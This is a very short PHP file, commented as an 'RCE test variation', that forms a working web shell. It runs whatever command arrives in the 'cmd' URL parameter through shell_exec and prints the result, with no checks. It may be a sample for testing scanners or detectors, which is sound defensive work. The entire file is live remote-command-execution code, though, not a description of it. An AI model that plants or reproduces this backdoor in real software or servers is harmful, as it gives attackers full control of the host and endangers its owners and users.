<?php
// RCE test variation #15
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>